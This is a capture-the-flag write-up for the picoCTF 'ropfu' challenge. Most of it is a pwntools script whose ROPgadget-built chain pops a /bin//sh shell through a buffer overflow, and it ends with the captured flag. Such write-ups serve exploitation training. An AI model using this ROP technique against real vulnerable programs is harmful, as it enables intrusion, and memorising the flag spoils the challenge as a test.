# ropfu

### Description
> What's ROP?

### Solution
It just generates `ropchain` using `ROPgadget`.

```
$ ROPgadget --binary vuln --ropchain
```

Final solver

```python
from pwn import *

file = "./vuln"
host = "saturn.picoctf.net"
port = 64140
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = process(file)
#io = remote(host, port)

pld = b"\x90"*28

#ROPgadget --binary vuln --ropchain
pld += p32(0x080583c9) # pop edx ; pop ebx ; ret
pld += p32(0x080e5060) # @ .data
pld += p32(0x41414141) # padding
pld += p32(0x080b074a) # pop eax ; ret
pld += b"/bin"
pld += p32(0x08059102) # mov dword ptr [edx], eax ; ret
pld += p32(0x080583c9) # pop edx ; pop ebx ; ret
pld += p32(0x080e5064) # @ .data + 4
pld += p32(0x41414141) # padding
pld += p32(0x080b074a) # pop eax ; ret
pld += b"//sh"
pld += p32(0x08059102) # mov dword ptr [edx], eax ; ret
pld += p32(0x080583c9) # pop edx ; pop ebx ; ret
pld += p32(0x080e5068) # @ .data + 8
pld += p32(0x41414141) # padding
pld += p32(0x0804fb90) # xor eax, eax ; ret
pld += p32(0x08059102) # mov dword ptr [edx], eax ; ret
pld += p32(0x08049022) # pop ebx ; ret
pld += p32(0x080e5060) # @ .data
pld += p32(0x08049e39) # pop ecx ; ret
pld += p32(0x080e5068) # @ .data + 8
pld += p32(0x080583c9) # pop edx ; pop ebx ; ret
pld += p32(0x080e5068) # @ .data + 8
pld += p32(0x080e5060) # padding without overwrite ebx
pld += p32(0x0804fb90) # xor eax, eax ; ret
pld += p32(0x0808055e) # inc eax ; ret
pld += p32(0x0808055e) # inc eax ; ret
pld += p32(0x0808055e) # inc eax ; ret
pld += p32(0x0808055e) # inc eax ; ret
pld += p32(0x0808055e) # inc eax ; ret
pld += p32(0x0808055e) # inc eax ; ret
pld += p32(0x0808055e) # inc eax ; ret
pld += p32(0x0808055e) # inc eax ; ret
pld += p32(0x0808055e) # inc eax ; ret
pld += p32(0x0808055e) # inc eax ; ret
pld += p32(0x0808055e) # inc eax ; ret
pld += p32(0x0804a3d2) # int 0x80

io.sendlineafter("grasshopper!", pld)

io.interactive()
#picoCTF{5n47ch_7h3_5h311_0f1f9878}
```

### Writer
[yu1hpa](https://twitter.com/yu1hpa)
